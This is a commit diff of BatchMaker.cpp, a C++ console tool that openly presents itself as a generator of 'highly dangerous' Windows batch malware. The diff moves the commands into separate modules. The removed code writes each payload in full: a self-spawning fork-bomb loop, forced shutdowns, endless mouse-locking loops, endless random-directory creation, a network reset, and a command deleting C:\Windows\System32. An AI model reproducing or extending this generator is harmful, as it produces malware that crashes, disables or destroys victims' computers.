ec3f52f894e0ab758ef7db589057b5af2a4ca75e
LoRy24 <lorytherock24tutorial@gmail.com>
2021-03-26 22:28:05 +0100

    Update BatchMaker.cpp

--- src/BatchMaker.cpp
+++ src/BatchMaker.cpp
@@ -7,160 +7,79 @@
 
 #include "./ConsoleUtils.h"
 #include "commands/ListCommand.h"
+#include "commands/SimplemalwareCommand.h"
+#include "commands/PcdownCommand.h"
+#include "commands/RipcomputerCommand.h"
+#include "commands/EnjavaerrorCommand.h"
+#include "commands/InfoCommand.h"
+#include "commands/SilentmalwareCommand.h"
+#include "commands/TookmouseCommand.h"
+#include "commands/BlockconnectionCommand.h"
+#include "commands/PcdestroyCommand.h"
 
 using namespace std;
 
 int main() {
-	typedef struct {
-		string errore {"Errore non previsto nella creazione del file."}; //struttura contentente le frasi degli errori
-	} Errors;
-	Errors errors;
 	string select;
 
-	// invia i primi messaggi allo start del software
 	setcolor(0x4);
-	cout << "Benvenuto in Batch Maker! by Sapphire Security" << endl << "Hai a disposizione un certo numero di exploit, che puoi creare scrivendo sul " << 
-		"programma\n" << "il nome dell'exploit che vuoi creare." << endl << endl << "Per visualizzare la lista degli exploit digita 'list'" << 
-		endl << "Per ottenere informazioni sul prodotto digita 'info'" << endl;
+	cout << "Benvenuto in Batch Maker! by Sapphire Security" << endl;
+	cout << "Hai a disposizione un certo numero di exploit, che puoi creare scrivendo sul programma il nome dell'exploit che vuoi creare.\n\n" ;
+	cout << "Per visualizzare la lista degli exploit digita \"list\"\n" << "Per ottenere informazioni sul " << 
+			"prodotto digita \"info\"" << endl;
 
 	while (true) {
+		setcolor(0x4);
 		cout << "\nScelta: ";
 		setcolor(0x9);
 		getline(cin, select);
 		setcolor(0x4);
 		transform(select.begin(), select.end(), select.begin(), [] (unsigned char c) { return tolower(c); });
 
-		if (select == "list") {
+		if (select == "list") { 
 			executeListCmd();
 			continue;
 		}
 
 		if (select == "simplemalware") {
-			
+			executeSimplemalware(); 
 			continue;
 		}
+
+		if (select == "pcdown") { executePcdown(); continue; }
+
+		if (select == "ripcomputer") { 
+			executeRipcomputer(); 
+			continue;
+		}
+
+		if (select == "enjavaerror") { executeEnjavaerror(); continue; }
+
+		if (select == "info") {
+			executeInfo();
+			continue;
+		}
+
+		if (select == "clear") { system("cls"); continue; }
+
+		if (select == "silentmalware") {
+			executeSilentmalware();
+			continue;
+		}
+
+		if (select == "tookmouse") { executeTookmouse(); continue; }
+
+		if (select == "blockconnection") { 
+			executeBlockconnection(); 
+			continue; 
+		}
+
+		if (select == "pcdestroy") { executePcdestroy(); 
+			continue; 
+		}
+
+		cout << "\nComando non trovato!" << endl;
 	}
 
 	return 0x0;
 }
-
-
-int fix() {
-
-	typedef struct {
-		string errore {"Errore non previsto nella creazione del file."}; //struttura contentente le frasi degli errori
-	} Errori;
-	Errori errori;
-	string scelta;
-
-	while (true){ // qui viene scritta tutta la logica del codice
-		if (scelta == "simplemalware" || scelta == "Simplemalware") { // se invece il comando è "simplemalware", allora esegue quanto segue
-			try {
-				ofstream simplemalware("simplemalware.bat"); // crea il file
-				// scrive nel file alcune stringhe
-				simplemalware << ":1\n";
-				simplemalware << "start\n";
-				simplemalware << "goto 1";
-            	cout << "\nFile creato con successo!\n";
-				simplemalware.close(); // chiude la connessione del file
-			}catch (...){
-				cerr << errori.errore << endl; // nel caso non riseca ad esegure le azioni scritte sopra, invierà questo errore.
-			}
-		} else if (scelta == "pcdown" || scelta == "Pcdown") { // se invece il comando è "pcdown" allora esegue quanto segue
-          	try {
-              	ofstream pcdown("pcdown.bat"); // crea il file
-              	pcdown << "shutdown -p"; // scrive quanto segue al suo interno
-              	cout << "\nFile creato con successo!\n";
-              	pcdown.close(); // chiude la connessione del file
-          	}catch (...){
-              	cerr << errori.errore; // nel caso non riesca ad esegure le azioni scritte sopra, invierà questo errore.
-          	}
-		} else if (scelta == "ripcomputer" || scelta == "Ripcomputer"){ // se invece il comando è "ripcomputer" allora esegue quanto segue
-            try {
-                ofstream ripcomputer("ripcomputer.bat"); // crea il file
-                ripcomputer << ":1\n";
-                ripcomputer << "start chrome\n";
-                ripcomputer << "start chrome\n";
-                ripcomputer << "shutdown -s -t 10";
-                cout << "\nFile creato con successo!\n";
-				ripcomputer.close(); // chiude la connessione del file
-            }catch (...){
-                cerr << errori.errore; // nel caso non riesca ad esegure le azioni scritte sopra, invierà questo errore.
-            }    
-	} else if (scelta == "enjavaerror" || scelta == "Enjavaerror"){ // se invece il comando è "enjavaerror" allora esegue quanto segue
-		try {
-			ofstream enjavaerror("enjavaerror.bat"); // crea il file
-			enjavaerror << ("@echo off\n");
-			enjavaerror << (":1\n");
-			enjavaerror << ("RunDll32.exe user32.dll,SetCursorPos 100 100\n");
-			enjavaerror << ("echo EnJava colpisce ancora! Non puoi muovere il tuo mouse!\n");
-			enjavaerror << ("goto 1");
-			cout << "\nFile creato con successo!\n";
-			enjavaerror.close(); // chiude la connessione del file	
-		}catch (...){
-			cerr << errori.errore; // nel caso non riesca ad esegure le azioni scritte sopra, invierà questo errore
-		}
-	} else if (scelta == "info" || scelta == "Info") { // se invece il comando è "help" allora esegue quanto segue
-		setcolor(7);
-		cout << "---" << endl;
-		setcolor(4);
-		cout << "BatchMaker e' un software ideato per la realizzazione di malware in Batch.\nIl progetto e' stato inizialmente sviluppato dal team di Sicurezza Informatica" << endl;
-        cout << "Sapphire Security, che ha passato la cura del progetto alla comunità \"EnJava\". Il programma permette" << endl;
-        cout << "la creazione di malware altamente pericolosi scritti in Batch.\nLo sviluppatore principale e' ThaMessia" << endl;
-        setcolor(7);
-        cout << "---" << endl;
-        setcolor(4);
-	} else if (scelta == "silentmalware" || scelta == "Silentmalware") { // se invece il comando è "silentmalware" allora esegue quanto segue
-		try {
-			ofstream silentmalware("silentmalware.bat"); // crea il file
-			silentmalware << ("@echo off\n");
-			silentmalware << (":1\n");
-			silentmalware << ("mkdir %random%\n");
-			silentmalware << ("goto 1");
-			cout << "\nFile creato con successo!\n";
-			silentmalware.close();
-		}catch (...){
-			cerr << errori.errore;
-		}
-	} else if (scelta == "tookmouse" || scelta == "Tookmouse") { // se invece il comando è "tookmouse" allora esegue quanto segue
-		try {
-			ofstream tookmouse("tookmouse.bat"); // crea il file
-			tookmouse << ("@echo off\n");
-			tookmouse << (":1\n");
-			tookmouse << ("RunDll32.exe user32.dll,SetCursorPos 50 75\n");
-			tookmouse << ("RunDll32.exe user32.dll,SetCursorPos 70 30\n");
-			tookmouse << ("goto 1");
-			cout << "\nFile creato con successo!\n";
-			tookmouse.close();
-		}catch (...){
-			cerr << errori.errore;
-		}
-	} else if (scelta == "blockconnection" || scelta == "Blockconnection") {
-        try {
-            ofstream blockconnection("blockconnection.bat");
-            blockconnection << ("@Echo off  Ipconfig/renew");
-            cout << "\nFile creato con successo!\n";
-            blockconnection.close();
-        } catch(...) {
-            cerr << errori.errore;
-        }
-        
-    } else if (scelta == "pcdestroy" || scelta == "Pcdestroy") {
-        try
-        {
-           ofstream specificblock("specificblock.bat");
-           specificblock << ("del C:\\Windows\\System32");
-           cout << "\nFile creato con successo!\n";
-           specificblock.close();
-        } catch(...) {
-            errori.errore;
-        }
-    } else if (scelta == "clear" || scelta == "Clear") {
-    	system("cls");
-	} else {
-        cout << "\nComando non trovato. Digita 'list' per una lista di comandi.\n";
-    }
-	}
-	return 0; // ritorna a 0 (Signfica che il software è stato eseguito con successo)
-}
-
